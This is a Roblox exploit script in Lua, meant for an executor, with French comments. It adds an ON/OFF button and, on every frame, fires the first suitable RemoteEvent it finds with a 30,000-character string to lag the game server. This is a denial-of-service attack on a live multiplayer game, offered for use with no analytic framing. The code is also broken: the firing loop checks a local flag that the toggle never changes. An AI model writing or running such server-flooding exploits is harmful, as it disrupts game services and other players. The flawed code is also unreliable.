local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local isLagging = false
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28" 


local num = string.rep("z", 30000) 


local target = nil
for _, v in pairs(game:GetDescendants()) do

    if v:IsA("RemoteEvent") and v.Name ~= "friendmain" and v.Name ~= "ping" then
        target = v
        break
    end
end


-- ASSURE que la variable existe
getgenv().isLagging = false

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- UI
local gui = Instance.new("ScreenGui")
gui.Name = "MobileToggle"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Size = UDim2.fromScale(0.1, 0.04)
button.Position = UDim2.fromScale(0.02, 0.92)
button.Text = "OFF"
button.BackgroundColor3 = Color3.fromRGB(40,40,40)
button.TextColor3 = Color3.new(1,1,1)
button.BorderSizePixel = 0
button.TextScaled = true
button.Parent = gui

-- Fonction toggle
local function toggle()
    getgenv().isLagging = not getgenv().isLagging

    if getgenv().isLagging then
        button.Text = "ON"
        button.BackgroundColor3 = Color3.fromRGB(0,120,0)
    else
        button.Text = "OFF"
        button.BackgroundColor3 = Color3.fromRGB(40,40,40)
    end

    warn("isLagging =", getgenv().isLagging)
end

-- Support MOBILE + PC
button.MouseButton1Click:Connect(toggle)
button.TouchTap:Connect(toggle)





RunService.Heartbeat:Connect(function()
    if isLagging and target then
         for i = 1, 1 do
            target:FireServer(uuid, num)
        end
    end
end)
